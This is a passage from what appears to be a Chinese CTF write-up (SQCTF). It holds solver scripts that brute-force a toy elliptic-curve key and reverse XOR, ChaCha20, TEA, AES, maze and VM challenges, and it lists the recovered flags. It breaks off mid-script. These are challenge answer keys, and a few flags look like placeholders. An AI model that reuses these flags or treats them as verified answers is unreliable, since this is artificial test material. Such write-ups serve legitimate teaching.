+    &quot;&quot;&quot;Computes the modular inverse of k modulo p.&quot;&quot;&quot;
+    if k == 0:
+        raise ZeroDivisionError(&#39;division by zero&#39;)
+    # Fermat&#39;s Little Theorem (if p is prime): k^(p-2) % p
+    # Using Python 3.8+ built-in:
+    inv = pow(k, -1, p)
+    if inv is None:
+         raise ValueError(f&quot;Modular inverse does not exist for &#123;k&#125; mod &#123;p&#125;&quot;)
+    return inv
+
+# --- Elliptic Curve Point Addition ---
+# O represents the point at infinity
+def point_add(P1, P2, a, p):
+    &quot;&quot;&quot;Adds two points P1 and P2 on the elliptic curve.&quot;&quot;&quot;
+    O = None # Point at infinity
+
+    if P1 == O:
+        return P2
+    if P2 == O:
+        return P1
+
+    x1, y1 = P1
+    x2, y2 = P2
+
+    if x1 == x2 and (y1 + y2) % p == 0:
+        return O # P1 + (-P1) = O
+
+    if x1 == x2 and y1 == y2: # Point doubling case
+        return point_double(P1, a, p)
+
+    # Point addition P1 != P2
+    try:
+        # Calculate slope (lambda)
+        numerator = (y2 - y1) % p
+        denominator = (x2 - x1) % p
+        inv_denominator = inverse_mod(denominator, p)
+        m = (numerator * inv_denominator) % p
+
+        # Calculate new coordinates
+        x3 = (m**2 - x1 - x2) % p
+        y3 = (m * (x1 - x3) - y1) % p
+
+        return (x3, y3)
+    except (ZeroDivisionError, ValueError):
+        # Handle cases where inverse doesn&#39;t exist if denominator is 0 mod p
+        # This shouldn&#39;t happen if P1 != +/- P2
+        print(f&quot;Error during point addition between &#123;P1&#125; and &#123;P2&#125;&quot;)
+        return O # Or raise an error
+
+
+# --- Elliptic Curve Point Doubling ---
+def point_double(P, a, p):
+    &quot;&quot;&quot;Doubles a point P on the elliptic curve.&quot;&quot;&quot;
+    O = None # Point at infinity
+
+    if P == O:
+        return O
+
+    x, y = P
+
+    if y == 0: # Tangent is vertical
+        return O
+
+    try:
+        # Calculate slope (lambda)
+        numerator = (3 * x**2 + a) % p
+        denominator = (2 * y) % p
+        inv_denominator = inverse_mod(denominator, p)
+        m = (numerator * inv_denominator) % p
+
+        # Calculate new coordinates
+        x3 = (m**2 - 2 * x) % p
+        y3 = (m * (x - x3) - y) % p
+
+        return (x3, y3)
+    except (ZeroDivisionError, ValueError):
+         # Handle cases where inverse doesn&#39;t exist (e.g., 2y = 0 mod p)
+        print(f&quot;Error during point doubling for &#123;P&#125;&quot;)
+        return O # Or raise an error
+
+
+# --- Scalar Multiplication (Basic Double-and-Add - Not used in this brute force) ---
+# Included for completeness, but the brute force below uses iterative addition.
+def scalar_multiply(k, P, a, p):
+    &quot;&quot;&quot;Computes k * P using the double-and-add algorithm.&quot;&quot;&quot;
+    O = None
+    result = O
+    addend = P
+
+    while k &gt; 0:
+        if k &amp; 1: # If the last bit is 1
+            result = point_add(result, addend, a, p)
+        # Double the addend for the next bit
+        addend = point_double(addend, a, p)
+        k &gt;&gt;= 1 # Move to the next bit
+
+    return result
+
+# --- Brute-Force Search for the Secret Key ---
+print(&quot;Starting brute-force search for the secret key...&quot;)
+print(f&quot;Curve: y^2 = x^3 + &#123;a&#125;x + &#123;b&#125; (mod &#123;p&#125;)&quot;)
+print(f&quot;Base Point G = &#123;G&#125;&quot;)
+print(f&quot;Public Key = &#123;PublicKey&#125;&quot;)
+print(&quot;-&quot; * 30)
+
+start_time = time.time()
+current_point = G       # Start with 1 * G
+secretKey = 1
+max_tries = p # Theoretical upper limit (order might be smaller)
+
+while secretKey &lt;= max_tries:
+    if current_point == PublicKey:
+        end_time = time.time()
+        print(f&quot;\nSuccess! Found secretKey (d): &#123;secretKey&#125;&quot;)
+        print(f&quot;Verification: &#123;secretKey&#125; * G = &#123;current_point&#125;&quot;)
+        print(f&quot;Time taken: &#123;end_time - start_time:.2f&#125; seconds&quot;)
+        break
+
+    # Calculate the next point: (current_key + 1) * G = (current_key * G) + G
+    current_point = point_add(current_point, G, a, p)
+    secretKey += 1
+
+    # Optional: Print progress periodically (can slow down the process)
+    if secretKey % 10000 == 0:
+        elapsed_time = time.time() - start_time
+        print(f&quot;Checked up to key &#123;secretKey&#125;... Current point: &#123;current_point&#125; Time: &#123;elapsed_time:.2f&#125;s&quot;)
+
+    # Check if we encountered the point at infinity unexpectedly or looped
+    if current_point is None and secretKey &lt; max_tries:
+         print(f&quot;\nEncountered point at infinity after &#123;secretKey&#125; additions. Public key not found with this method or error occurred.&quot;)
+         break
+
+else: # Loop finished without break
+    end_time = time.time()
+    print(f&quot;\nSearch completed up to &#123;max_tries&#125; without finding the secret key.&quot;)
+    print(f&quot;Time taken: &#123;end_time - start_time:.2f&#125; seconds&quot;)
+
+# --- If secretKey was found, proceed to decrypt ---
+# Note: This part will only execute if the brute-force above succeeds.
+if &#39;secretKey&#39; in locals() and current_point == PublicKey:
+    print(&quot;\nProceeding to decryption using the found secretKey...&quot;)
+
+    # Ciphertext components
+    C1 = (5081741, 6744615)
+    C2 = (610619, 6218)
+
+    # 1. Calculate S&#39; = d * C1
+    print(f&quot;Calculating S&#39; = &#123;secretKey&#125; * C1(&#123;C1&#125;)&quot;)
+    # Need the full scalar_multiply function for this step
+    # Re-implementing scalar_multiply here for clarity in the decryption phase
+    def scalar_multiply_decrypt(k, P, a, p):
+        O = None
+        result = O
+        addend = P
+        count = 0
+        while k &gt; 0:
+            if k &amp; 1: # If the last bit is 1
+                result = point_add(result, addend, a, p)
+            # Double the addend for the next bit
+            addend = point_double(addend, a, p)
+            k &gt;&gt;= 1 # Move to the next bit
+            count += 1
+            # Optional progress for potentially long scalar multiplication
+            # if count % 1000 == 0:
+            #    print(f&quot;Scalar multiplication progress: bit &#123;count&#125;&quot;)
+            if addend == O and k &gt; 0:
+                 print(&quot;Warning: Addend became point at infinity during scalar multiplication.&quot;)
+                 # This might indicate an issue or reaching the order of the point
+                 break
+        return result
+
+    S_prime = scalar_multiply_decrypt(secretKey, C1, a, p)
+    print(f&quot;Calculated S&#39; = &#123;S_prime&#125;&quot;)
+
+    if S_prime is None:
+        print(&quot;Error: Calculation of S&#39; resulted in the point at infinity. Cannot decrypt.&quot;)
+    else:
+        # 2. Calculate -S&#39;
+        Sx_prime, Sy_prime = S_prime
+        Sy_prime_inv = (-Sy_prime) % p
+        S_prime_inv = (Sx_prime, Sy_prime_inv)
+        print(f&quot;Calculated -S&#39; = &#123;S_prime_inv&#125;&quot;)
+
+        # 3. Calculate M = C2 + (-S&#39;)
+        print(f&quot;Calculating M = C2(&#123;C2&#125;) + (-S&#39;)(&#123;S_prime_inv&#125;)&quot;)
+        M = point_add(C2, S_prime_inv, a, p)
+        print(f&quot;Decrypted Point M = &#123;M&#125;&quot;)
+
+        if M is None:
+            print(&quot;Error: Decryption resulted in the point at infinity.&quot;)
+        else:
+            # 4. Calculate x + y from M = (x, y)
+            Mx, My = M
+            result_sum = Mx + My
+            print(&quot;-&quot; * 30)
+            print(f&quot;Decrypted message point M = (&#123;Mx&#125;, &#123;My&#125;)&quot;)
+            print(f&quot;The final result x + y = &#123;Mx&#125; + &#123;My&#125; = &#123;result_sum&#125;&quot;)
+            print(&quot;-&quot; * 30)
+
+else:
+     print(&quot;\nDecryption cannot proceed because the secret key was not found.&quot;)
+</code></pre>
+<p>SQCTF{5720914}</p>
+<h1 id="Reverse-解出13题"><a href="#Reverse-解出13题" class="headerlink" title="Reverse 解出13题"></a>Reverse 解出13题</h1><h2 id="天下谁人不识君"><a href="#天下谁人不识君" class="headerlink" title="天下谁人不识君"></a>天下谁人不识君</h2><pre><code class="python">flag = &#39;SQCTF&#123;xxxxxxxxxxxxxx&#125;&#39;
+s = &#39;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#39;
+result = &#39;&#39;
+for i in range(len(flag)):
+    s1 = ord(flag[i])//17
+    s2 = ord(flag[i])%17
+    result += s[(s1+i)%34]+s[-(s2+i+1)%34]
+print(result)
+# result = &#39;v7b3boika$h4h5j0jhkh161h79393i5x010j0y8n$i&#39;
+
+s = &#39;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#39;
+encoded_flag = &#39;v7b3boika$h4h5j0jhkh161h79393i5x010j0y8n$i&#39;
+flag_length = len(encoded_flag) // 2
+reversed_flag = [&#39;&#39;] * flag_length
+
+for i in range(flag_length):
+    char1_encoded = encoded_flag[2 * i]
+    char2_encoded = encoded_flag[2 * i + 1]
+
+    index1_encoded = s.find(char1_encoded)
+    index2_encoded = s.find(char2_encoded)
+
+    for char_code in range(32, 127):  # Iterate through printable ASCII characters
+        s1_candidate = char_code // 17
+        s2_candidate = char_code % 17
+
+        if (s1_candidate + i) % 34 == index1_encoded and -(s2_candidate + i + 1) % 34 == index2_encoded:
+            reversed_flag[i] = chr(char_code)
+            break
+
+print(&quot;Reversed flag:&quot;, &quot;&quot;.join(reversed_flag))
+</code></pre>
+<p>SQCTF{libai_jianxian}</p>
+<h2 id="遇事不决，可问春风"><a href="#遇事不决，可问春风" class="headerlink" title="遇事不决，可问春风"></a>遇事不决，可问春风</h2><p>这段代码是一个Android应用的逆向分析结果，用于生成和验证Flag。以下是关键步骤分析：</p>
+<ol>
+<li><p><strong>Flag结构</strong>：</p>
+<pre><code class="java">private String buildFlag(String password) &#123;
+    return &quot;SQCTF&#123;i_am_a_&quot; + password + &quot;&#125;&quot;;
+&#125;
+</code></pre>
+<p>Flag格式为<code>SQCTF&#123;i_am_a_密码&#125;</code>，其中密码需要解密得到。</p>
+</li>
+<li><p><strong>密码验证逻辑</strong>：</p>
+<pre><code class="java">private boolean checkPassword(String input) &#123;
+    return input.equals(this.decryptPassword());
+&#125;
+</code></pre>
+<p>用户输入需要等于<code>decryptPassword()</code>的解密结果。</p>
+</li>
+<li><p><strong>密码解密过程</strong>：</p>
+<pre><code class="java">private String decryptPassword() &#123;
+    String encrypted = getEncryptedPassword(); // 获取加密后的字符串
+    char[] chars = encrypted.toCharArray();
+    StringBuilder result = new StringBuilder();
+    for (int i = 0; i &lt; chars.length; i++) &#123;
+        char c = (char) (chars[i] ^ 0x42); // 每个字符与0x42异或
+        result.append(c);
+    &#125;
+    return result.toString();
+&#125;
+</code></pre>
+</li>
+<li><p><strong>加密字符串生成</strong>：</p>
+<pre><code class="java">private String getEncryptedPassword() &#123;
+    String[] parts = &#123;&quot;5&quot;,&quot;#&quot;,&quot;)&quot;,&quot;7&quot;,&quot;5&quot;,&quot;#&quot;,&quot;)&quot;,&quot;7&quot;&#125;;
+    StringBuilder sb = new StringBuilder();
+    for (String part : parts) &#123;
+        sb.append(part);
+    &#125;
+    return sb.toString(); // 结果为&quot;5#)75#)7&quot;
+&#125;
+</code></pre>
+</li>
+<li><p><strong>逐字符解密</strong>：</p>
+<ul>
+<li><code>5</code> → ASCII 0x35 → 0x35 ^ 0x42 &#x3D; 0x77 → <code>w</code></li>
+<li><code>#</code> → ASCII 0x23 → 0x23 ^ 0x42 &#x3D; 0x61 → <code>a</code></li>
+<li><code>)</code> → ASCII 0x29 → 0x29 ^ 0x42 &#x3D; 0x6B → <code>k</code></li>
+<li><code>7</code> → ASCII 0x37 → 0x37 ^ 0x42 &#x3D; 0x75 → <code>u</code></li>
+<li>重复后得到完整密码：**<code>wakuwaku</code>**</li>
+</ul>
+</li>
+</ol>
+<p><strong>最终Flag</strong>：</p>
+<pre><code>SQCTF&#123;i_am_a_wakuwaku&#125;
+</code></pre>
+<h2 id="人生自古谁无死"><a href="#人生自古谁无死" class="headerlink" title="人生自古谁无死"></a>人生自古谁无死</h2><p>本质上是chacha20加密</p>
+<pre><code class="python"># 生成v3密钥
+g_obf2 = b&#39;\xde\xad\xbe\xef&#39;
+v3 = bytes([g_obf2[i % 4] ^ (i + 17) for i in range(32)])
+
+# 构造ChaCha20初始状态
+constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]
+key = [int.from_bytes(v3[i*4:(i+1)*4], &#39;little&#39;) for i in range(8)]
+nonce_part = [17 * j for j in range(12)]
+nonce = [
+    int.from_bytes(bytes(nonce_part[0:4]), &#39;little&#39;),
+    int.from_bytes(bytes(nonce_part[4:8]), &#39;little&#39;),
+    int.from_bytes(bytes(nonce_part[8:12]), &#39;little&#39;)
+]
+counter = 0
+state = constants + key + [counter] + nonce
+
+# ChaCha20轮函数
+def rol32(v, n):
+    return ((v &lt;&lt; n) &amp; 0xFFFFFFFF) | (v &gt;&gt; (32 - n))
+
+def chacha20_quarter_round(a, b, c, d):
+    a = (a + b) &amp; 0xFFFFFFFF
+    d = rol32(d ^ a, 16)
+    c = (c + d) &amp; 0xFFFFFFFF
+    b = rol32(b ^ c, 12)
+    a = (a + b) &amp; 0xFFFFFFFF
+    d = rol32(d ^ a, 8)
+    c = (c + d) &amp; 0xFFFFFFFF
+    b = rol32(b ^ c, 7)
+    return a, b, c, d
+
+def chacha20_block(state):
+    working_state = state.copy()
+    for _ in range(10):
+        # 四列处理
+        working_state[0], working_state[4], working_state[8], working_state[12] = chacha20_quarter_round(working_state[0], working_state[4], working_state[8], working_state[12])
+        working_state[1], working_state[5], working_state[9], working_state[13] = chacha20_quarter_round(working_state[1], working_state[5], working_state[9], working_state[13])
+        working_state[2], working_state[6], working_state[10], working_state[14] = chacha20_quarter_round(working_state[2], working_state[6], working_state[10], working_state[14])
+        working_state[3], working_state[7], working_state[11], working_state[15] = chacha20_quarter_round(working_state[3], working_state[7], working_state[11], working_state[15])
+        # 四对角线处理
+        working_state[0], working_state[5], working_state[10], working_state[15] = chacha20_quarter_round(working_state[0], working_state[5], working_state[10], working_state[15])
+        working_state[1], working_state[6], working_state[11], working_state[12] = chacha20_quarter_round(working_state[1], working_state[6], working_state[11], working_state[12])
+        working_state[2], working_state[7], working_state[8], working_state[13] = chacha20_quarter_round(working_state[2], working_state[7], working_state[8], working_state[13])
+        working_state[3], working_state[4], working_state[9], working_state[14] = chacha20_quarter_round(working_state[3], working_state[4], working_state[9], working_state[14])
+    # 相加初始state
+    for i in range(16):
+        working_state[i] = (working_state[i] + state[i]) &amp; 0xFFFFFFFF
+    # 转换为字节流
+    return b&#39;&#39;.join([s.to_bytes(4, &#39;little&#39;) for s in working_state])
+
+# 生成密钥流
+key_stream = chacha20_block(state.copy())
+
+# 假设已知密文（需替换为实际值）
+ciphertext = b&#39;\xD0\xA1\x14\xB7\x58\xFA\x85\x91\x41\x53\x1B\x60\x38\xAB\xA5\x02\x29\xCB\xDD\x28\x4E\x67\xE6\x32\xD9&#39;  # 替换为实际密文
+plaintext = bytes([c ^ key_stream[i] for i, c in enumerate(ciphertext)])
+
+print(&quot;Decrypted Flag:&quot;, plaintext.decode(&#39;latin-1&#39;))
+</code></pre>
+<p>SQCTF{real_chacha20_flag}</p>
+<h2 id="春风也有春风愁"><a href="#春风也有春风愁" class="headerlink" title="春风也有春风愁"></a>春风也有春风愁</h2><p>异或加密</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+
+int main() &#123;
+    uint8_t v6[15];
+
+    // 将64位无符号整数0xFBF715FA08FD0B0D赋值到数组的起始位置
+    *(uint64_t *)v6 = 0xFBF715FA08FD0B0DULL;
+
+    // 将64位无符号整数0xF0E011431130DFB赋值到数组从第7个字节开始的位置
+    *(uint64_t *)&amp;v6[7] = 0xF0E011431130DFBLL;
+
+    // 打印数组的每个字节
+    for (int i = 0; i &lt; 15; i++) &#123;
+        printf(&quot;v6[%d] = %d\n&quot;, i, v6[i]);
+    &#125;
+
+    return 0;
+&#125;
+</code></pre>
+<pre><code class="python">v6 = [0]*15
+v6[0] = 13
+v6[1] = 11
+v6[2] = 253
+v6[3] = 8
+v6[4] = 250
+v6[5] = 21
+v6[6] = 247
+v6[7] = 251
+v6[8] = 13
+v6[9] = 19
+v6[10] = 49
+v6[11] = 20
+v6[12] = 1
+v6[13] = 14
+v6[14] = 15
+
+flag = []
+
+
+for byte in v6:
+    decrypted = (byte - 55) ^ 0xA5
+    decrypted &amp;= 0xFF  # 确保在 0~255 范围内
+    try:
+        flag.append(chr(decrypted))
+    except ValueError:
+        flag.append(f&quot;\\x&#123;decrypted:02x&#125;&quot;)  # 无法打印的字符转为十六进制
+
+print(&quot;Flag:&quot;, &#39;&#39;.join(flag))
+</code></pre>
+<p>sqctf{easy_xor}</p>
+<h2 id="你若安好便是晴"><a href="#你若安好便是晴" class="headerlink" title="你若安好便是晴"></a>你若安好便是晴</h2><pre><code class="python">import struct
+
+def sub_101(data, key):
+    v0 = struct.unpack(&quot;&lt;I&quot;, data[:4])[0]
+    v1 = struct.unpack(&quot;&lt;I&quot;, data[4:8])[0]
+    sum_val = 0xC6EF3720
+    delta = 0x61C88647
+    for _ in range(32):
+        term1 = (v0 + sum_val) &amp; 0xFFFFFFFF
+        term2 = ((v0 &lt;&lt; 4) + key[2]) &amp; 0xFFFFFFFF
+        term3 = ((v0 &gt;&gt; 5) + key[3]) &amp; 0xFFFFFFFF
+        v1 = (v1 - (term1 ^ term2 ^ term3)) &amp; 0xFFFFFFFF
+
+        term4 = (v1 + sum_val) &amp; 0xFFFFFFFF
+        term5 = ((v1 &lt;&lt; 4) + key[0]) &amp; 0xFFFFFFFF
+        term6 = ((v1 &gt;&gt; 5) + key[1]) &amp; 0xFFFFFFFF
+        v0 = (v0 - (term4 ^ term5 ^ term6)) &amp; 0xFFFFFFFF
+
+        sum_val = (sum_val + delta) &amp; 0xFFFFFFFF
+    return struct.pack(&quot;&lt;II&quot;, v0, v1)
+
+# The rest of your script (sub_102, sub_100, main) remains the same.
+
+def sub_102(data):
+    length = len(data)
+    if length &gt; 0:
+        index = ord(data[length - 1])
+        if index &lt; length:
+            return data[:length - index]
+    return data
+
+def sub_100(data, key):
+    result = bytearray()
+    for char in data:
+        result.append(char ^ key)
+    return bytes(result)
+
+def main():
+    str_hex = &quot;7f1f17fd8e51aa660b8036914a4950e8fa8078a2ef33608650fb7a845226f2d1&quot;
+    str_bytes = bytes.fromhex(str_hex)
+    v10 = len(str_bytes)
+
+    v6 = [305419896, -2023406815 &amp; 0xFFFFFFFF, -1412567144 &amp; 0xFFFFFFFF, -1728127814 &amp; 0xFFFFFFFF]
+
+    processed_bytes = bytearray(str_bytes)
+    for j in range(0, v10, 8):
+        block = processed_bytes[j:j+8]
+        if len(block) == 8:
+            decrypted_block = sub_101(block, v6)
+            processed_bytes[j:j+8] = decrypted_block
+
+    truncated_bytes = sub_102(bytes(processed_bytes).decode(&#39;latin-1&#39;, errors=&#39;ignore&#39;))
+    v6_5 = 22
+    final_bytes = sub_100(truncated_bytes.encode(&#39;latin-1&#39;), v6_5)
+
+    print(final_bytes.decode(&#39;latin-1&#39;))
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>SQCTF{nihaobuhaobuhaoxixi}</p>
+<h2 id="即随本心"><a href="#即随本心" class="headerlink" title="即随本心"></a>即随本心</h2><p>还是pyinstaller打包的exe<br>pyinstxtractor解包后反编译pyc只能得到部分内容，不过完全够用了<br>AES加密</p>
+<pre><code class="python">key = b&#39;1234567890abcdef&#39;
+iv = b&#39;1234567890abcdef&#39;
+expected_encrypted_data = &#39;MTIzNDU2Nzg5MGFiY2RlZpOn0SHxbVMvaa7jQztMCBtCCiuX+ZRBzSfcL01St5Bmi8BjGeuXliictrjqzSpCGw==&#39;
+</code></pre>
+<p>这些是关键内容，直接丢给cyberchef一把梭</p>
+<p>得到<code>SQCTF&#123;qianniananshi_yidengjiming&#125;</code></p>
+<h2 id="唧唧复唧唧，木兰当户织"><a href="#唧唧复唧唧，木兰当户织" class="headerlink" title="唧唧复唧唧，木兰当户织"></a>唧唧复唧唧，木兰当户织</h2><p>逆向得到base64<br>直接解得到SQCTF{xixibuxixi，mulandanghuzhi}<br>把逗号改成半角逗号就行了<br>SQCTF{xixibuxixi,mulandanghuzhi}</p>
+<h2 id="看山不是山"><a href="#看山不是山" class="headerlink" title="看山不是山"></a>看山不是山</h2><p>依旧是pyinstaller打包的exe<br>pyinstxtractor解包后反编译得到：</p>
+<pre><code class="python">def encrypt(data):
+    result = []
+    key = 439041101
+    for i in range(len(data)):
+        byte = data[i]
+        byte = (byte ^ key &gt;&gt; (i % 4) * 8) &amp; 255
+        byte = byte + i &amp; 255
+        result.append(byte)
+    return bytes(result)
+
+
+def check(data):
+    target = bytes.fromhex(&#39;738495a6b7c8d9e0f123456789abcdef&#39;)
+    if len(data) != 16:
+        return False
+    encrypted = None(data)
+    return encrypted == target
+</code></pre>
+<p>解码：</p>
+<pre><code class="python">def decrypt(encrypted):
+    key = 439041101
+    key_bytes = [(key &gt;&gt; (shift * 8)) &amp; 0xFF for shift in [0, 1, 2, 3]]
+    result = []
+    for i in range(len(encrypted)):
+        kb = key_bytes[i % 4]
+        byte = (encrypted[i] - i) % 256
+        byte ^= kb
+        result.append(byte)
+    return bytes(result)
+
+# 目标加密值
+target = bytes.fromhex(&#39;738495a6b7c8d9e0f123456789abcdef&#39;)
+# 解密得到原始数据
+original = decrypt(target)
+print(&quot;Flag:&quot;, original.hex())
+</code></pre>
+<p>SQCTF{3ebfb8b9fefff8c3a426104630a294fa}</p>
+<h2 id="ezRe"><a href="#ezRe" class="headerlink" title="ezRe"></a>ezRe</h2><p>pyinstxtractor解包后反编译pyc得到下面的内容</p>
+<pre><code class="python"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information
+# Version : Python 3.9
+
+import base64
+encoded_flag = &#39;NWVkMmJlNDUtMmU4My00OGQyLWI2MzEtYzA4OGU1MWVlOTY0&#39;
+flag = base64.b64decode(encoded_flag).decode(&#39;utf-8&#39;)
+print(flag)
+</code></pre>
+<p>把<code>5ed2be45-2e83-48d2-b631-c088e51ee964</code>base64解码一下就能得到flag内容，然后与SQCTF{}拼合一下</p>
+<p>SQCTF{5ed2be45-2e83-48d2-b631-c088e51ee964}</p>
+<h2 id="慕然回首，那人却在灯火阑珊处"><a href="#慕然回首，那人却在灯火阑珊处" class="headerlink" title="慕然回首，那人却在灯火阑珊处"></a>慕然回首，那人却在灯火阑珊处</h2><p>ida打开发现有个maze数组</p>
+<p>进hex里看一下，提出来迷宫</p>
+<pre><code class="text">S**#########*########**#########**#########*###**##***###**##*#####**##*#####*E##*******############
+</code></pre>
+<p>gemini写的，直接上解题脚本</p>
+<pre><code class="python">from collections import deque
+
+maze_string = &quot;S**#########*########**#########**#########*###**##***###**##*#####**##*#####*E##*******############&quot;
+maze_grid = [list(maze_string[i:i+10]) for i in range(0, 100, 10)]
+
+def is_valid(r, c):
+    return 0 &lt;= r &lt; 10 and 0 &lt;= c &lt; 10
+
+def solve():
+    start_pos = None
+    end_pos = None
+    for r in range(10):
+        for c in range(10):
+            if maze_grid[r][c] == &#39;S&#39;:
+                start_pos = (r, c)
+            elif maze_grid[r][c] == &#39;E&#39;:
+                end_pos = (r, c)
+
+    if not start_pos or not end_pos:
+        return None
+
+    start_r, start_c = start_pos
+    end_r, end_c = end_pos
+
+    queue = deque([(start_r, start_c, &quot;&quot;)])
+    visited = set([(start_r, start_c)])
+
+    while queue:
+        r, c, path = queue.popleft()
+
+        if r == end_r and c == end_c:
+            return path
+
+        # Move right &#39;d&#39;
+        new_r, new_c = r, c + 1
+        if is_valid(new_r, new_c) and maze_grid[new_r][new_c] != &#39;#&#39; and (new_r, new_c) not in visited:
+            visited.add((new_r, new_c))
+            queue.append((new_r, new_c, path + &#39;d&#39;))
+
+        # Move down &#39;s&#39;
+        new_r, new_c = r + 1, c
+        if is_valid(new_r, new_c) and maze_grid[new_r][new_c] != &#39;#&#39; and (new_r, new_c) not in visited:
+            visited.add((new_r, new_c))
+            queue.append((new_r, new_c, path + &#39;s&#39;))
+
+        # Move up &#39;w&#39;
+        new_r, new_c = r - 1, c
+        if is_valid(new_r, new_c) and maze_grid[new_r][new_c] != &#39;#&#39; and (new_r, new_c) not in visited:
+            visited.add((new_r, new_c))
+            queue.append((new_r, new_c, path + &#39;w&#39;))
+
+        # Move left &#39;a&#39;
+        new_r, new_c = r, c - 1
+        if is_valid(new_r, new_c) and maze_grid[new_r][new_c] != &#39;#&#39; and (new_r, new_c) not in visited:
+            visited.add((new_r, new_c))
+            queue.append((new_r, new_c, path + &#39;a&#39;))
+
+    return None
+
+path = solve()
+if path:
+    flag = f&quot;sqctf&#123;&#123;&#123;path&#125;&#125;&#125;&quot;
+    print(flag)
+else:
+    print(&quot;No path found.&quot;)
+</code></pre>
+<p>sqctf{ddsssdssaasssddddddwd}</p>
+<h2 id="鹅鹅鹅，曲项向天歌"><a href="#鹅鹅鹅，曲项向天歌" class="headerlink" title="鹅鹅鹅，曲项向天歌"></a>鹅鹅鹅，曲项向天歌</h2><p>pyinstxtractor解包后反编译pyc得到下面的内容</p>
+<pre><code class="python"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information
+# Version : Python 3.10
+
+
+def verification():
+    part1 = &#39;flag&#123;&#39;
+    part2 = &#39;xxxxxxxxxxxxxxxxxxxxxxx&#39;
+    part3 = &#39;&#125;&#39;
+    tmp = &#39;&#39;
+    part2_1 = part2[:7]
+    part2_2 = part2[7:20]
+    part2_3 = part2[20:]
+    for i in range(len(part2_1)):
+        tmp += chr(ord(part2_1[i]) + 5)
+    for i in range(len(part2_2)):
+        tmp += chr(ord(part2_2[i]) + 0)
+    for i in range(len(part2_3)):
+        tmp += chr(ord(part2_3[i]) - 7)
+    ciphertext = &#39;itd~tzw_know_sanmenxbZ8&#39;
+    true_flag = part1 + part2 + part3
+</code></pre>
+<p>写个脚本逆向一下</p>
+<pre><code class="python">def decrypt(ciphertext):
+    # 分割密文
+    part2_1 = ciphertext[:7]
+    part2_2 = ciphertext[7:20]
+    part2_3 = ciphertext[20:]
+
+    # 解密每个部分
+    decrypted_part2_1 = &#39;&#39;.join(chr(ord(char) - 5) for char in part2_1)
+    decrypted_part2_2 = &#39;&#39;.join(chr(ord(char) - 0) for char in part2_2)
+    decrypted_part2_3 = &#39;&#39;.join(chr(ord(char) + 7) for char in part2_3)
+
+    # 合并解密后的部分
+    decrypted_part2 = decrypted_part2_1 + decrypted_part2_2 + decrypted_part2_3
+    return decrypted_part2
+
+# 给定的密文
+ciphertext = &#39;itd~tzw_know_sanmenxbZ8&#39;
+
+# 解密得到part2
+decrypted_part2 = decrypt(ciphertext)
+
+# 构造完整的flag
+flag = f&#39;flag&#123;&#123;&#123;decrypted_part2&#125;&#125;&#125;&#39;
+flag
+</code></pre>
+<p>flag{do_your_know_sanmenxia?}</p>
+<h2 id="圣人当仁不让"><a href="#圣人当仁不让" class="headerlink" title="圣人当仁不让"></a>圣人当仁不让</h2><p>ida反编译看一下算法</p>
+<p>实现了一个简单的字节操作函数，其功能是对输入的字符数组进行一系列的位运算。具体来说，对于数组中的每个元素，它先与0xAA进行异或操作，然后加5，再减2。这个操作对数组的前16个元素（0x10表示16）进行，然后对输出的内容做了base64加密</p>
+<p>那就逆向一下这个操作</p>
+<pre><code class="python">import base64
+
+# Base64 encoded string
+encoded_str = &quot;/P7sAe/U0s7c1vjb0vjfyt==&quot;
+
+# Decode the string
+decoded_bytes = base64.b64decode(encoded_str)
+
+output_bytes = bytearray()
+
+for byte in decoded_bytes:
+    reversed_byte = ((byte + 2) % 256 - 5) % 256 ^ 0xAA
+    output_bytes.append(reversed_byte)
+
+# 输出结果
+output_bytes
+</code></pre>
+<p>得到flag</p>
+<p>SQCTF{easy_re_vm}</p>
+<h2 id="往事暗沉不可追"><a href="#往事暗沉不可追" class="headerlink" title="往事暗沉不可追"></a>往事暗沉不可追</h2><p>pyinstxtractor解包后反编译pyc得到下面的内容</p>
+<pre><code class="python">#!/usr/bin/env python
+# visit https://tool.lu/pyc/ for more information
+# Version: Python 3.10
+
+
+class SimpleVM:
+    
+    def __init__(self):
+        self.memory = [
+            0] * 256
+        self.registers = [
+            0] * 16
+
+    
+    def load(self, reg, addr):
+        self.registers[reg] = self.memory[addr]
+
+    
+    def store(self, reg, addr):
+        self.memory[addr] = self.registers[reg]
+
+    
+    def xor(self, reg, value):
+        self.registers[reg] ^= value
+
+    
+    def execute(self, bytecode):
+        ip = 0
+        if ip &lt; len(bytecode):
+            op = bytecode[ip]
+            if op == &#39;LOAD&#39;:
+                reg = bytecode[ip + 1]
+                addr = bytecode[ip + 2]
+                self.load(reg, addr)
+                ip += 3
+            elif op == &#39;STORE&#39;:
+                reg = bytecode[ip + 1]
+                addr = bytecode[ip + 2]
+                self.store(reg, addr)
+                ip += 3
+            elif op == &#39;XOR&#39;:
+                reg = bytecode[ip + 1]
+                value = bytecode[ip + 2]
+                self.xor(reg, value)
+                ip += 3
+            else:
+                raise ValueError(f&#39;&#39;&#39;Unknown opcode: &#123;op&#125;&#39;&#39;&#39;)
+            if not None &lt; len(bytecode):
+                return None
+            return None
+
+    
+    def get_memory(self):
+        return self.memory
+
+
+bytecode = [
+    &#39;LOAD&#39;,
+    0,
+    16,
+    &#39;XOR&#39;,
+    0,
+    85,
+    &#39;STORE&#39;,
+    0,
+    32,
+    &#39;LOAD&#39;,
+    1,
+    32,
+    &#39;XOR&#39;,
+    1,
+    170,
+    &#39;STORE&#39;,
+    1,
+    48]
+encrypted_data = [
+    127,
+    131,
+    125,
+    123,
+    135,
+    127,
+    133,
+    123,
+    125,
+    131,
+    127,
+    135,
+    131,
+    123,
+    135,
+    125]
+vm = SimpleVM()
+vm.memory[16:16 + len(encrypted_data)] = encrypted_data
+vm.execute(bytecode)
+final_memory = vm.get_memory()
+</code></pre>
+<p>解码脚本</p>
+<pre><code class="python">encrypted_data = [
+    127,
+    131,
+    125,
+    123,
+    135,
+    127,
+    133,
+    123,
+    125,
+    131,
+    127,
+    135,
+    131,
+    123,
+    135,
+    125]
+
+# Step 1: XOR with 170 to reverse the second XOR operation
+step1_decrypted = [data ^ 170 for data in encrypted_data]
+
